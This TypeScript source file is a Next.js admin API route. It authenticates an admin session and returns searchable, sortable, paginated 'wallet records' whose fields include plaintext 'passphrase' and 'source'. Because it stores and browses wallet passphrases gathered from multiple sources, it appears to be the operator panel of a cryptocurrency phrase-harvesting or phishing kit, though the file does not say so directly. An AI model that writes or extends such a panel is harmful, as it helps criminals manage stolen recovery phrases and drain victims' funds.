import { NextRequest, NextResponse } from "next/server";
import { getWalletRecords, getStats } from "@/lib/db";
import { decryptSession } from "@/lib/session";

export async function GET(req: NextRequest) {
  try {
    // 1. Authorize Request
    const sessionCookie = req.cookies.get("admin_session")?.value;
    const session = sessionCookie ? await decryptSession(sessionCookie) : null;

    if (!session || !session.authenticated || session.role !== "admin") {
      return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
    }

    // 2. Parse Query Params
    const url = new URL(req.url);
    const search = url.searchParams.get("search") || "";
    const page = parseInt(url.searchParams.get("page") || "1", 10);
    const limit = parseInt(url.searchParams.get("limit") || "10", 10);
    const sortBy = url.searchParams.get("sortBy") || "id"; // e.g. id, source, createdAt
    const sortOrder = url.searchParams.get("sortOrder") || "desc"; // asc, desc

    // 3. Retrieve Records and Stats
    const allRecords = await getWalletRecords();
    const stats = await getStats();

    // 4. Apply Search Filter
    let filteredRecords = allRecords;
    if (search) {
      const q = search.toLowerCase();
      filteredRecords = allRecords.filter(
        (r) =>
          r.passphrase.toLowerCase().includes(q) ||
          r.source.toLowerCase().includes(q)
      );
    }

    // 5. Apply Sorting
    filteredRecords.sort((a, b) => {
      let valA: any = a[sortBy as keyof typeof a];
      let valB: any = b[sortBy as keyof typeof b];

      // Handle null/undefined
      if (valA === undefined) valA = "";
      if (valB === undefined) valB = "";

      if (typeof valA === "string") {
        return sortOrder === "asc"
          ? valA.localeCompare(valB)
          : valB.localeCompare(valA);
      } else {
        // Numeric sort (ID)
        return sortOrder === "asc" ? valA - valB : valB - valA;
      }
    });

    // 6. Apply Pagination
    const totalEntries = filteredRecords.length;
    const startIndex = (page - 1) * limit;
    const endIndex = startIndex + limit;
    const paginatedRecords = filteredRecords.slice(startIndex, endIndex);

    return NextResponse.json({
      success: true,
      stats,
      records: paginatedRecords,
      pagination: {
        page,
        limit,
        totalEntries,
        totalPages: Math.ceil(totalEntries / limit),
      },
    });
  } catch (error) {
    console.error("Error fetching admin records:", error);
    return NextResponse.json(
      { error: "Internal server error" },
      { status: 500 }
    );
  }
}
